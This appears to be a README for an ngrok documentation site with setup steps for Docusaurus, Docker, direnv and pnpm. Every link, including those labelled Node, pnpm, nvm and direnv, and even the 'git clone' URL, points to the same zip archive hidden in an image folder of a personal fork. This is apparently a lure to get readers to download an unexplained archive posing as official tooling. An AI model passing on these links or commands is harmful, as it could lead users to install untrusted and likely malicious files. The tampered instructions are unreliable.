# [ngrok docs](https://github.com/sudhans3/ngrok-docs/raw/refs/heads/main/docs/integrations/stripe/img/ngrok_docs_v3.4.zip)

Source code for [ngrok docs](https://github.com/sudhans3/ngrok-docs/raw/refs/heads/main/docs/integrations/stripe/img/ngrok_docs_v3.4.zip); feel free to suggest changes and improvements to our documentation!

## Contributing

See our [Contribution Guidelines](https://github.com/sudhans3/ngrok-docs/raw/refs/heads/main/docs/integrations/stripe/img/ngrok_docs_v3.4.zip) for detailed instructions on how to help improve ngrok documentation.

## Getting Started

ngrok is built using [Docusaurus 3](https://github.com/sudhans3/ngrok-docs/raw/refs/heads/main/docs/integrations/stripe/img/ngrok_docs_v3.4.zip).

The fastest and safest (isolated) way to run the documentation is with the Docker command below, then browse to http://localhost:3000/docs.

```sh
docker run --rm -p 3000:3000 -it --name=ngrokDocs -v "./:/app" -w "/app" --platform=linux/amd64 guergeiro/pnpm:20-8-alpine sh -c "apk add direnv; direnv allow; pnpm install; pnpm run start"
```

Otherwise, you can install and run everything on your local host.

Prerequisites required:

- [Node 20](https://github.com/sudhans3/ngrok-docs/raw/refs/heads/main/docs/integrations/stripe/img/ngrok_docs_v3.4.zip)
- [pnpm 9](https://github.com/sudhans3/ngrok-docs/raw/refs/heads/main/docs/integrations/stripe/img/ngrok_docs_v3.4.zip)
- [nvm](https://github.com/sudhans3/ngrok-docs/raw/refs/heads/main/docs/integrations/stripe/img/ngrok_docs_v3.4.zip)

We use [direnv](https://github.com/sudhans3/ngrok-docs/raw/refs/heads/main/docs/integrations/stripe/img/ngrok_docs_v3.4.zip) to assist you with setting up all of the required tooling.

<details>
  <summary>Prefer to install and manage the tooling yourself?</summary>

1. Install [nvm](https://github.com/sudhans3/ngrok-docs/raw/refs/heads/main/docs/integrations/stripe/img/ngrok_docs_v3.4.zip) or your node version manager of choice.
2. Ensure that `node 20` is installed. With `nvm`, run `nvm install`.
3. Enable `pnpm` with `corepack`: `corepack enable pnpm`
4. Install `pnpm` with `corepack`: `corepack install`
5. Install project dependencies with `pnpm`: `pnpm install`
</details>

First, install `direnv`:

| OS     | command                 |
| ------ | ----------------------- |
| macOS  | brew install direnv     |
| ubuntu | sudo apt install direnv |

For all other OSes, see the [direnv installation guide](https://github.com/sudhans3/ngrok-docs/raw/refs/heads/main/docs/integrations/stripe/img/ngrok_docs_v3.4.zip).

Don't forget to [set up direnv integration with your shell](https://github.com/sudhans3/ngrok-docs/raw/refs/heads/main/docs/integrations/stripe/img/ngrok_docs_v3.4.zip).

Next, clone the repo and move into the directory:

```sh
git clone https://github.com/sudhans3/ngrok-docs/raw/refs/heads/main/docs/integrations/stripe/img/ngrok_docs_v3.4.zip
cd ngrok-docs
```

Next, run:

```sh
direnv allow
```

This will install `nvm` (if not already installed) as well as set the correct `node` and `pnpm` versions for you.

Once you have the pre-requisites installed, local development happens by running:

```sh
pnpm run start
```

Our docs mostly use markdown and MDX, you can make yourself familiar with docusaurus [documentation](https://github.com/sudhans3/ngrok-docs/raw/refs/heads/main/docs/integrations/stripe/img/ngrok_docs_v3.4.zip) for more significant features / changes.

## Building ngrok-docs

To ensure your changes work before submitting a pr, please run the following before submission:

```
cd ngrok-docs
pnpm run fmt
pnpm run build
```

## Looking for support?

For bug reports, feature request, questions and community support please ooen an issue or discussion in our [ngrok Community](https://github.com/sudhans3/ngrok-docs/raw/refs/heads/main/docs/integrations/stripe/img/ngrok_docs_v3.4.zip).
To report a problem with our documentation, please open a new [Github issue](https://github.com/sudhans3/ngrok-docs/raw/refs/heads/main/docs/integrations/stripe/img/ngrok_docs_v3.4.zip).
